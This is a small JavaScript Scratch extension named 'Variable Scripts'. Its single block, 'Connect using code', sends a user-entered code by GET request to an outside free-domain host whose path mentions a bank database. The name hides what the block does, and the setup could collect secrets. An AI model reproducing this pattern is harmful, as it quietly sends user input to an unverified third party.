(function(ext) {
    ext._shutdown = function() {};

    ext._getStatus = function() {
        return {
            status: 2,
            msg: 'Ready'
        };
    };
    var vars = {};

    var descriptor = {
        blocks: [
            [' ', 'Connect using code %s', 'connect', 'HgI2)#rD2J']
        ],

        menus: {}
    };
    ext.connect = function (code) {
        $.ajax({
            type: "GET",
            url: "http://bank-r2dbconn.htaccessgenerator.cf/connect/db/bank/",
            data: {
                code: code
            }
        })
    }
    ScratchExtensions.register('Variable Scripts', descriptor, ext);
})({});
